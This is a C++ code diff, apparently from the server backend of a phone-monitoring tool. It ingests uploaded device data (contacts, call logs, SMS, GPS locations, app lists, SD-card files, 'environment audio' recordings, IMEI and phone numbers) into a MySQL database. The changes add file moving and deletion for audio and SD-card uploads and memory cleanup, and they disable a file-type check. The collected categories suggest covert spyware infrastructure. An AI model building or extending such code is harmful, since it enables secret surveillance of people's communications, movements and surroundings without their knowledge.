@@ -32,6 +32,27 @@ DWORD str2time(char *str) {
 }
 
 
+string stripfilepath(string filepath) {
+	char* flag = "\\workspace\\public\\files\\";
+	int pos = filepath.find(flag);
+	if (pos > 0)
+	{
+		string fp = /*string("..\\") + */filepath.substr(pos + lstrlenA(flag) );
+		return fp;
+	}
+	else {
+		flag = "/workspace/public/files/";
+		pos = filepath.find(flag);
+		if (pos > 0)
+		{
+			string fp = /*string("../") +*/ filepath.substr(pos + lstrlenA(flag));
+			return fp;
+		}
+	}
+
+	return "";
+}
+
 string timestamp2calender(time_t t) {
 	struct tm* pTimetm = localtime(&t);
 	char sztime[256];
@@ -68,8 +89,9 @@ int Translate::writeAddress(char * data, int datasize, string username, string c
 			result = writeSys(0, 0, username, clientname);
 		}
 	}
-
+	delete mysql;
 	MySql::leaveLock();
+
 	return TRUE;
 }
 
@@ -97,27 +119,37 @@ int Translate::writeCall(char * data, int datasize, string username, string clie
 			result = writeSys(0, 0, username, clientname);
 		}
 	}
-	
+	delete mysql;
 	MySql::leaveLock();
+
 	return TRUE;
 }
 
-int Translate::writeSdcard(char * data, int datasize, string username, string clientname, string filepath, string filename) {
+int Translate::writeSdcard(char * szdstpath, string username, string clientname, string srcfilepath, string filename) {
+	int result = 0;
 	MySql::enterLock();
 	MySql * mysql = new MySql();
 
+	string filepath = string(szdstpath) + filename;
+
+	result =MoveFileA(srcfilepath.c_str(), filepath.c_str());
 	int filesize = FileOperator::getfilesize(filepath);
-	int result = 0;
-	result = mysql->insertAllFiles(username, clientname, filename, filepath, filesize, 3);
+
+
+	//filepath = stripfilepath(filepath);
+
+	result = mysql->insertAllFiles(username, clientname, filename, filename, filesize, 2);
 	if (result == 0)
 	{
 		result = writeSys(0, 0, username, clientname);
 	}
+	delete mysql;
 	MySql::leaveLock();
 	return TRUE;
 }
 
-int Translate::writeAudio(char * data, int datasize, string username, string clientname, string filepath) {
+int Translate::writeAudio(char * szdstpath, string username, string clientname, string srcfilepath, string filename) {
+	int result = 0;
 	MySql::enterLock();
 	MySql * mysql = new MySql();
 
@@ -126,13 +158,20 @@ int Translate::writeAudio(char * data, int datasize, string username, string cli
 	GetLocalTime(&systime);
 	wsprintfA(sztime, "%d_%d_%d_%d_%d_%d", systime.wYear, systime.wMonth, systime.wDay, systime.wHour, systime.wMinute, systime.wSecond);
 
+	string filepath = string(szdstpath) + filename;
+
+	result = MoveFileA(srcfilepath.c_str(), filepath.c_str());
+
 	int filesize = FileOperator::getfilesize(filepath);
-	int result = 0;
-	result = mysql->insertEnviromentAudio(username, clientname, sztime, filepath,filesize, filesize/1024);
+
+	//filepath = stripfilepath(filepath);
+
+	result = mysql->insertEnviromentAudio(username, clientname, sztime, filename,filesize, filesize);
 	if (result == 0)
 	{
 		result = writeSys(0, 0, username, clientname);
 	}
+	delete mysql;
 	MySql::leaveLock();
 	return TRUE;
 }
@@ -168,6 +207,7 @@ int Translate::writeApp(char * data, int datasize, string username, string clien
 			result = writeSys(0, 0, username, clientname);
 		}
 	}
+	delete mysql;
 	MySql::leaveLock();
 
 	return TRUE;
@@ -211,8 +251,7 @@ int Translate::writeSys(char * data, int datasize, string username, string clien
 
 		result = XMLParser::getvalue(data, "MODEL", model, &size, TRUE);
 
-		MySql::enterLock();
-		MySql * mysql = new MySql();
+
 
 		string format =
 			"{\"IMEI0\":\"%s\",\"型号\":\"%s\",\"sim卡状态\":\"%s\",\"商标\":\"%s\",\"手机号码1\":\"%s\","
@@ -238,6 +277,9 @@ int Translate::writeSys(char * data, int datasize, string username, string clien
 			"", "", screen, "",
 			"", "", "", clientname.c_str(), "", "", "");
 
+		MySql::enterLock();
+		MySql* mysql = new MySql();
+
 		char * newutf8info = 0;
 		int len = Coder::GBKToUTF8(newgbkinfo, &newutf8info);
 		if (len > 0) {
@@ -245,12 +287,16 @@ int Translate::writeSys(char * data, int datasize, string username, string clien
 			delete newutf8info;
 		}
 
+		delete mysql;
 		MySql::leaveLock();
 	}
 	else {
 		MySql::enterLock();
 		MySql * mysql = new MySql();
 		result = mysql->insertClient(username, clientname, "", clientname);
+
+		delete mysql;
+		MySql::leaveLock();
 	}
 	return TRUE;
 }
@@ -285,6 +331,7 @@ int Translate::writeSms(char * data, int datasize, string username, string clien
 			result = writeSys(0, 0, username, clientname);
 		}
 	}
+	delete mysql;
 	MySql::leaveLock();
 	return TRUE;
 }
@@ -316,6 +363,7 @@ int Translate::writeLocation(char * data, int datasize, string username, string 
 	{
 		result = writeSys(0, 0, username, clientname);
 	}
+	delete mysql;
 	MySql::leaveLock();
 	return TRUE;
 }
@@ -323,7 +371,7 @@ int Translate::writeLocation(char * data, int datasize, string username, string 
 int g_totalcnt = 0;
 
 
-int Translate::process(char * szdir,string username,string clientname) {
+int Translate::process(char * szdir,char * szdstdir,string username,string clientname) {
 	
 	int result = 0;
 
@@ -342,7 +390,8 @@ int Translate::process(char * szdir,string username,string clientname) {
 	{
 		if (find.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
 		{
-			if (memcmp(find.cFileName + lstrlenA(find.cFileName) - 4, ".dat", 4) == 0)
+			if(1)
+			//if (memcmp(find.cFileName + lstrlenA(find.cFileName) - 4, ".dat", 4) == 0)
 			{
 				char * szaddr = "address";
 				char * szapp = "app";
@@ -418,11 +467,13 @@ int Translate::process(char * szdir,string username,string clientname) {
 				}
 				else if (memcmp(function, szaudio, lstrlenA(szaudio)) == 0)
 				{
-					result = writeAudio(0, 0, username, clientname,filename);
+					result = writeAudio(szdstdir, username, clientname,filename, find.cFileName);
+					DeleteFileA(filename);
 				}
 				else if (memcmp(function, szsdcard, lstrlenA(szsdcard)) == 0)
 				{
-					result = writeSdcard(0, 0, username, clientname, filename, find.cFileName);
+					result = writeSdcard(szdstdir,username, clientname, filename, find.cFileName);
+					DeleteFileA(filename);
 				}
 				else if (memcmp(function, szcall, lstrlenA(szcall)) == 0)
 				{
@@ -481,7 +532,7 @@ int Translate::process(char * szdir,string username,string clientname) {
 					
 				lstrcatA(nextpath, find.cFileName);
 				lstrcatA(nextpath, "\\");
-				process(nextpath,"","");
+				process(nextpath,szdstdir,"","");
 			}
 		}
 
@@ -500,6 +551,8 @@ int Translate::process(char * szdir,string username,string clientname) {
 void Translate::mainLoop(Translate*cls) {
 
 	char szdir[MAX_PATH];
+
+	char szdstdir[_MAX_PATH];
 	int result = 0;
 
 	result = GetModuleFileNameA(0, szdir, MAX_PATH);
@@ -514,6 +567,10 @@ void Translate::mainLoop(Translate*cls) {
 				if (szdir[i] == '\\')
 				{
 					szdir[i] = 0;
+
+					lstrcpyA(szdstdir, szdir);
+					lstrcatA(szdstdir, "\\files\\");
+
 					lstrcatA(szdir, "\\data_root\\");
 
 					g_totalcnt = 0;
@@ -521,7 +578,7 @@ void Translate::mainLoop(Translate*cls) {
 					while (1)
 					{
 						
-						cls->process(szdir, "", "");
+						cls->process(szdir,szdstdir, "", "");
 						Sleep(3000);
 					}
 					
